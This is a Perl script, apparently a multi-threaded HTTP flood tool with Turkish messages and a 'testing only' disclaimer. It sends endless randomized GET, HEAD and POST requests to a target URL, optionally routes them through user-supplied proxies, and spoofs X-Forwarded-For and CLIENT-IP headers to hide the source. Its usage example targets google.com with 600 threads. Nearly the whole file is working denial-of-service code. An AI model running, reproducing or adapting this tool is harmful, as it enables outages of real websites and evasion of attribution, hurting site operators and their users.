#!/usr/bin/perl
use strict;
use warnings;

package control;

my $ip;

sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
    my ($self,$veces) = @_;
    $veces = 1 if($veces eq "");
    my ($a,$e,$o,$b) = split(/\./,$ip);
    for(my $as=0;$as<$veces;$as++) {
        $b++;
        if($b>=255) {$b=0;$o++;}
        if($o>=255) {$o=0;$e++;}
        if($e>=255) {$e=0;$a++;}
        die("Sem Ip!\n") if($a>=255);
    }
    $ip = join "",$a,".",$e,".",$o,".",$b;
    return $ip;
}
1;

package main;
use Socket;
use IO::Socket::INET;
use threads ('yield', 'exit' => 'threads_only', 'stringify');
use threads::shared;

# --- Bilgilendirme ve Yasal Uyari ---
print "\n=============================================\n";
print "   BILGI / UYARI - geccsaa\n";
print "   Bu yazilim sadece test icindir.\n";
print "   Herhangi bir sisteme, kisiye veya kuruma IZINSIZ olarak kullanmak YASAL DEGILDIR.\n";
print "   Kullanimdan dogacak tum sorumluluk KULLANICIYA aittir!\n";
print "   Izinsiz kullananlar yasal olarak ceza alabilir.\n";
print "=============================================\n\n";

# --- Proxy Bilgi ---
print "Proxy adreslerini asagidaki formata uygun yazmalisiniz:\n";
print "  - Her proxy ip:port seklinde olmalidir.\n";
print "  - Ornek: 1.2.3.4:8080, 5.6.7.8:3128\n";
print "  - Birden fazla proxy girecekseniz, aralarina virgul (,) koyun.\n";
print "  - Proxy girmezseniz kendi IP adresiniz kullanilir.\n";
print "\n";

my ($host, $file, $puerto, $porconexion, $ipfake, $max, $sumador, $paquetesender, @thr);

# Proxy input
my @proxies;
print "Proxy girmek istiyor musunuz? (E/H): ";
my $cevap = <STDIN>;
chomp($cevap);
if(lc($cevap) eq "e") {
    print "Proxy adreslerini girin (ip:port), aralarina virgul koyun:\n";
    print "Ornek: 8.8.8.8:1080, 1.2.3.4:8080\n";
    my $giris = <STDIN>;
    chomp($giris);
    @proxies = grep { $_ =~ /^\d{1,3}(\.\d{1,3}){3}:\d+$/ } map { s/^\s+|\s+$//gr } split(/,/, $giris);
    if(@proxies < 1) {
        print STDERR "[geccsaa] HATA: Gecerli proxy girilmedi, kendi IP'niz kullanilacak.\n";
        @proxies = ();
    } else {
        print "[geccsaa] Proxy listesi yuklendi:\n";
        foreach my $p (@proxies) { print "  $p\n"; }
    }
} else {
    print "[geccsaa] Proxy kullanilmayacak, kendi IP'niz ile devam ediliyor.\n";
    @proxies = ();
}

my $proxy_idx :shared = 0;
sub next_proxy_idx {
    lock($proxy_idx);
    my $idx = $proxy_idx;
    $proxy_idx++;
    $proxy_idx = 0 if $proxy_idx >= @proxies;
    return $idx;
}

sub direct_connect {
    my ($host, $port) = @_;
    return IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 3
    );
}

sub proxy_connect_or_direct {
    my ($host, $port) = @_;
    if(@proxies > 0) {
        for (my $try = 0; $try < @proxies; $try++) {
            my $idx = next_proxy_idx();
            my $proxy = $proxies[$idx];
            my ($proxy_host, $proxy_port) = split(':', $proxy);
            my $sock = IO::Socket::INET->new(
                PeerAddr => $proxy_host,
                PeerPort => $proxy_port,
                Proto    => 'tcp',
                Timeout  => 3
            );
            if ($sock) {
                print $sock "CONNECT $host:$port HTTP/1.1\r\nHost: $host\r\n\r\n";
                my $line = <$sock>;
                if ($line && $line =~ /200 Connection established/i) {
                    return $sock;
                } else {
                    close($sock);
                    print STDERR "[geccsaa] HATA: Proxy baglantisi basarisiz ($line)\n";
                }
            } else {
                print STDERR "[geccsaa] HATA: Proxy socket acilmadi ($!)\n";
            }
        }
        my $direct_sock = direct_connect($host, $port);
        if (!$direct_sock) {
            print STDERR "[geccsaa] HATA: Dogrudan baglanti BASARISIZ! ($!)\n";
        }
        return $direct_sock;
    } else {
        my $direct_sock = direct_connect($host, $port);
        if (!$direct_sock) {
            print STDERR "[geccsaa] HATA: Dogrudan baglanti BASARISIZ! ($!)\n";
        }
        return $direct_sock;
    }
}

my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36",
    "curl/7.68.0",
    "python-requests/2.31.0"
);

my @accept_lang = (
    "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
);

my @accept_enc = ("gzip, deflate, br", "gzip, deflate", "identity");

my @methods = ("HEAD", "GET", "POST");

sub random_str { join "", map { ('a'..'z',0..9)[rand 36] } 1..shift; }
sub random_sleep { my $ms = int(rand(900)) + 100; select(undef,undef,undef,$ms/1000); }

sub generate_effective_http_packet {
    my ($host, $filepath, $ipinicial) = @_;

    my $method = $methods[int(rand(@methods))];
    my $ua = $user_agents[int(rand(@user_agents))];
    my $lang = $accept_lang[int(rand(@accept_lang))];
    my $enc = $accept_enc[int(rand(@accept_enc))];

    my $rand_path = $filepath;
    $rand_path =~ s/\{rand\}/int(rand(10000))/ge;
    $rand_path .= "/" . random_str(3+int(rand(6))) if rand()>0.6;
    my $rand_query = (rand()>0.4) ? "?q=" . random_str(4+int(rand(8))) : "";

    my $referrer = "https://".random_str(5+int(rand(6))).".com/" . random_str(3+int(rand(10)));
    my $cookie = "PHPSESSID=" . random_str(26) . "; uid=" . random_str(6+int(rand(6)));

    my $body = "";
    my $content_length = 0;
    if ($method eq "POST") {
        $body = "data=" . random_str(20+int(rand(1000)));
        $content_length = length($body);
    }

    my $packet = join "", 
        $method," /$rand_path$rand_query HTTP/1.1\r\n",
        "Host: $host\r\n",
        "User-Agent: $ua\r\n",
        "Referer: $referrer\r\n",
        "Cookie: $cookie\r\n",
        "CLIENT-IP: $ipinicial\r\n",
        "X-Forwarded-For: $ipinicial\r\n",
        "Accept: */*\r\n",
        "Accept-Language: $lang\r\n",
        "Accept-Encoding: $enc\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
        "Cache-Control: no-cache\r\n",
        "Pragma: no-cache\r\n",
        ($method eq "POST" ? "Content-Type: application/x-www-form-urlencoded\r\n" : ""),
        "Content-Length: $content_length\r\n",
        "Connection: Close\r\n\r\n",
        $body;

    return $packet;
}

my $hilo;
my @vals = ('a'..'z', 0..9);

sub sender {
    my ($max,$puerto,$host,$file) = @_;
    while(1) {
        my $sock = proxy_connect_or_direct($host, $puerto);
        unless($sock) {
            print STDERR "[geccsaa] HATA: Baglanti kurulamiyor! Bekleniyor...\n";
            sleep(5);
            next;
        }
        for(my $i=0;$i<$porconexion;$i++) {
            my $ipinicial = $sumador->mas(2+int(rand(10)));
            my $packet = generate_effective_http_packet($host, $file, $ipinicial);
            print $sock $packet;
            my $boyut_mb = length($packet) / (1024 * 1024);
            printf "[geccsaa] Gonderilen paket: %.3f MB\n", $boyut_mb;
            random_sleep();
        }
        close($sock);
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    while(1) {
        my $sock = proxy_connect_or_direct($host, $puerto);
        unless($sock) {
            print STDERR "[geccsaa] HATA: Baglanti kurulamiyor! Bekleniyor...\n";
            sleep(5);
            next;
        }
        print $sock $paquete;
        my $boyut_mb = length($paquete) / (1024 * 1024);
        printf "[geccsaa] Gonderilen paket: %.3f MB\n", $boyut_mb;
        random_sleep();
        close($sock);
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { threads->exit(); };
    my $url = $ARGV[0];
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) { exit; }
    if($url !~ /^http:\/\//) { die("[geccsaa] HATA: Gecersiz URL!\n"); }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
    if($ipfake eq "") {
        my $paquetebase = generate_effective_http_packet($host, $file, "127.0.0.1");
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        for(my $v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for(my $v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
    }
    for(my $v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
}

if($#ARGV > 2) {
    comenzar();
} else {
    die("\nperl geccsaa.pl http://www.google.com 600 200 127.0.0.1\nAuthor : geccsaa\n");
}
